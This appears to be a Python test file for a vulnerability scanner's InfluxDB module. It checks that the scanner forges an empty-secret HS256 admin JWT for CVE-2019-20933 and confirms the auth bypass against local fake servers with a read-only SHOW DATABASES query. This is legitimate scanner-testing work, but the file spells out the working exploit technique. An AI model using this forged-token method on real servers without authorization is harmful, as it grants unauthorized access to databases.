"""T2 SAFE proof for InfluxDB CVE-2019-20933 (empty-secret JWT auth bypass).

The T0 finding shipped as a version-only inference: version < 1.7.6 -> flag.
The T2 promotion actually forges an HS256 JWT signed with an EMPTY shared
secret (the CVE payload), replays one read - GET /query?q=SHOW DATABASES with
`Authorization: Bearer <jwt>` - and confirms the bypass when the server
answers HTTP 200 with a `results` payload. Read-only, single-shot, bounded.

Fixtures below are in-process HTTP fakes derived from the InfluxDB 1.x HTTP
API wire shape ({"results":[{"series":[{"columns":["name"],"values":[[...]]}]}]}
per the InfluxData "InfluxQL responses" reference).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

from recce.core.models import Host, Port
from recce.services.db import influxdb


def _http_server(handler_cls):
    srv = HTTPServer(("127.0.0.1", 0), handler_cls)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _host(port: int) -> Host:
    return Host(ip="127.0.0.1",
                ports=[Port(portid=port, service="influxdb", state="open")])


# ================================ JWT forge =================================


class ForgeEmptySecretJwt(unittest.TestCase):
    """The forged token must be a valid HS256 JWT (three base64url segments,
    with the signature computed over `header.payload` using an EMPTY HMAC-SHA256
    key). Verified end-to-end with a stdlib re-computation."""

    def test_three_segments_base64url(self):
        token = influxdb._forge_admin_jwt(secret=b"")
        parts = token.split(".")
        self.assertEqual(len(parts), 3, f"got {token!r}")
        for seg in parts:
            # base64url alphabet, no padding.
            for ch in seg:
                self.assertIn(ch, "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                              "abcdefghijklmnopqrstuvwxyz0123456789-_")

    def test_header_and_payload_shape(self):
        token = influxdb._forge_admin_jwt(secret=b"")
        h, p, _s = token.split(".")

        def _decode(seg: str) -> dict:
            pad = "=" * (-len(seg) % 4)
            return json.loads(base64.urlsafe_b64decode(seg + pad))

        header = _decode(h)
        payload = _decode(p)
        self.assertEqual(header["alg"], "HS256")
        self.assertEqual(header["typ"], "JWT")
        self.assertEqual(payload["username"], "admin")
        # exp is a unix timestamp in the future.
        self.assertGreater(payload["exp"], 0)

    def test_signature_verifies_with_empty_secret(self):
        token = influxdb._forge_admin_jwt(secret=b"")
        h, p, s = token.split(".")
        signing_input = (h + "." + p).encode()
        expected = base64.urlsafe_b64encode(
            hmac.new(b"", signing_input, hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        self.assertEqual(s, expected)


# ============================ Vulnerable 1.6.x server =======================


class JwtBypassConfirmedVulnerable(unittest.TestCase):
    """A vulnerable 1.6.4 server: /ping banners the version, unauthenticated
    /query is refused (401 - the operator has enabled auth), but /query with
    the forged empty-secret bearer returns HTTP 200 with a results payload.
    Probe must set jwt_bypass_confirmed and the finding must flip t0 -> t2."""

    def setUp(self):
        seen: list[str] = []

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                if self.path == "/ping":
                    self.send_response(204)
                    self.send_header("X-Influxdb-Version", "1.6.4")
                    self.end_headers()
                    return
                if self.path.startswith("/query"):
                    auth = self.headers.get("Authorization", "")
                    seen.append(auth)
                    if auth.startswith("Bearer "):
                        # The CVE: any signature verifies when the shared
                        # secret is empty. Return the wire shape a real
                        # SHOW DATABASES would.
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(json.dumps({"results": [{"series": [{
                            "columns": ["name"],
                            "values": [["_internal"], ["telegraf"],
                                       ["prod_metrics"]],
                        }]}]}).encode())
                        return
                    # No bearer -> auth is enforced.
                    self.send_response(401)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"error":"unable to parse authentication"}')
                    return
                self.send_response(404)
                self.end_headers()

        self.seen = seen
        self.srv, self.port = _http_server(H)

    def tearDown(self):
        self.srv.shutdown()

    def test_probe_confirms_bypass_and_captures_dbs(self):
        pr = influxdb.probe("127.0.0.1", self.port)
        self.assertEqual(pr["version"], "1.6.4")
        self.assertTrue(pr["secured"])
        self.assertFalse(pr["unauth"])
        self.assertTrue(pr.get("jwt_bypass_confirmed"))
        self.assertEqual(pr.get("jwt_bypass_status"), 200)
        dbs = pr.get("jwt_bypass_dbs") or []
        self.assertIn("telegraf", dbs)
        self.assertIn("prod_metrics", dbs)

    def test_finding_promoted_to_t2(self):
        pr = influxdb.probe("127.0.0.1", self.port)
        fs = influxdb.findings([_host(self.port)],
                               {("127.0.0.1", self.port): pr})
        bypass = [f for f in fs if f["kind"] == "influxdb_jwt_bypass"]
        self.assertEqual(len(bypass), 1)
        self.assertEqual(bypass[0]["depth_tier"], "t2")
        # Confirmed exploit gets the critical bump.
        self.assertEqual(bypass[0]["severity"], "critical")
        d = bypass[0]["detail"]
        self.assertIn("T2 proof", d)
        # User dbs surface in the detail; the noisy _internal is filtered.
        self.assertIn("prod_metrics", d)

    def test_bearer_actually_sent_on_wire(self):
        influxdb.probe("127.0.0.1", self.port)
        # First hit is unauth /query (T1 path); second hit is the JWT proof.
        bearers = [a for a in self.seen if a.startswith("Bearer ")]
        self.assertTrue(bearers,
                        f"expected a Bearer header on /query, saw {self.seen!r}")
        # And the token has the three-segment JWT shape.
        token = bearers[0].split(" ", 1)[1]
        self.assertEqual(len(token.split(".")), 3)


# ============================ Patched 1.7.6+ server =========================


class JwtBypassPatchedNoUpgrade(unittest.TestCase):
    """A patched build (>= 1.7.6): the version gate skips the whole JWT proof,
    the empty-secret probe never fires, and no jwt_bypass finding emits (there
    is no CVE-2019-20933 for this line). Guards against a false positive if the
    probe accidentally ran regardless of version."""

    def setUp(self):
        seen: list[str] = []

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                if self.path == "/ping":
                    self.send_response(204)
                    self.send_header("X-Influxdb-Version", "1.8.10")
                    self.end_headers()
                    return
                if self.path.startswith("/query"):
                    seen.append(self.headers.get("Authorization", ""))
                    # Even if a bearer arrives, refuse it - the CVE is fixed.
                    self.send_response(401)
                    self.end_headers()
                    return
                self.send_response(404)
                self.end_headers()

        self.seen = seen
        self.srv, self.port = _http_server(H)

    def tearDown(self):
        self.srv.shutdown()

    def test_probe_skips_bypass_helper(self):
        pr = influxdb.probe("127.0.0.1", self.port)
        self.assertEqual(pr["version"], "1.8.10")
        self.assertNotIn("jwt_bypass_confirmed", pr)
        self.assertNotIn("jwt_bypass_status", pr)
        # Only the T1 unauth probe fires; no Bearer ever hits the wire.
        for a in self.seen:
            self.assertFalse(a.startswith("Bearer "), self.seen)

    def test_no_jwt_finding_emitted(self):
        pr = influxdb.probe("127.0.0.1", self.port)
        fs = influxdb.findings([_host(self.port)],
                               {("127.0.0.1", self.port): pr})
        kinds = {f["kind"] for f in fs}
        self.assertNotIn("influxdb_jwt_bypass", kinds)


# ================= Vulnerable version but bypass rejected ===================


class JwtBypassVulnVersionButServerRejects(unittest.TestCase):
    """A vulnerable-versioned server that nonetheless rejects the empty-secret
    JWT (e.g. because an admin set a non-empty shared_secret manually, keeping
    the old build but out of the CVE class). The version-only T0 finding must
    still emit, but tier stays t0 - no T2 upgrade without server-side proof."""

    def setUp(self):
        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                if self.path == "/ping":
                    self.send_response(204)
                    self.send_header("X-Influxdb-Version", "1.5.2")
                    self.end_headers()
                    return
                if self.path.startswith("/query"):
                    # Always refuse - the shared secret is non-empty.
                    self.send_response(401)
                    self.end_headers()
                    return
                self.send_response(404)
                self.end_headers()

        self.srv, self.port = _http_server(H)

    def tearDown(self):
        self.srv.shutdown()

    def test_finding_stays_t0(self):
        pr = influxdb.probe("127.0.0.1", self.port)
        self.assertFalse(pr.get("jwt_bypass_confirmed"))
        # 401 was recorded on the JWT probe.
        self.assertEqual(pr.get("jwt_bypass_status"), 401)
        fs = influxdb.findings([_host(self.port)],
                               {("127.0.0.1", self.port): pr})
        bypass = [f for f in fs if f["kind"] == "influxdb_jwt_bypass"][0]
        self.assertEqual(bypass["depth_tier"], "t0")
        self.assertEqual(bypass["severity"], "high")
        self.assertNotIn("T2 proof", bypass["detail"])


# ======================= Vulnerable + unauth wide open ======================


class UnauthWideOpenSkipsBypassProof(unittest.TestCase):
    """When unauthenticated /query already returns databases, the JWT proof
    would add noise - the auth-bypass is moot when auth is off. Probe must not
    make the extra JWT request; the unauth finding still emits at t2."""

    def setUp(self):
        seen: list[str] = []

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                if self.path == "/ping":
                    self.send_response(204)
                    self.send_header("X-Influxdb-Version", "1.6.4")
                    self.end_headers()
                    return
                if self.path.startswith("/query"):
                    seen.append(self.headers.get("Authorization", ""))
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"results": [{"series": [{
                        "columns": ["name"],
                        "values": [["_internal"], ["metrics"]],
                    }]}]}).encode())
                    return
                self.send_response(404)
                self.end_headers()

        self.seen = seen
        self.srv, self.port = _http_server(H)

    def tearDown(self):
        self.srv.shutdown()

    def test_no_second_bearer_request(self):
        pr = influxdb.probe("127.0.0.1", self.port)
        self.assertTrue(pr["unauth"])
        # Only the T1 unauth /query fires - the JWT probe is skipped.
        self.assertEqual(len(self.seen), 1)
        self.assertFalse(self.seen[0].startswith("Bearer "))
        self.assertNotIn("jwt_bypass_confirmed", pr)


# ============================ Timeout / unreachable =========================


class JwtBypassProbeCleanTimeout(unittest.TestCase):
    """The T2 helper must never raise on a dead socket - a mid-probe timeout
    or connection refusal must be swallowed silently, leaving the version-only
    T0 finding untouched."""

    def test_helper_swallows_unreachable_target(self):
        out: dict = {}
        # 127.0.0.1:1 - unassigned TCP port; ConnectionRefused returns fast.
        influxdb._probe_jwt_bypass("127.0.0.1", 1, tls=False, timeout=2.0,
                                   out=out)
        self.assertNotIn("jwt_bypass_confirmed", out)
        # Status may or may not be set (depending on whether the socket
        # produced a response) but no confirmation must be recorded.
        self.assertFalse(out.get("jwt_bypass_confirmed"))


if __name__ == "__main__":
    unittest.main()
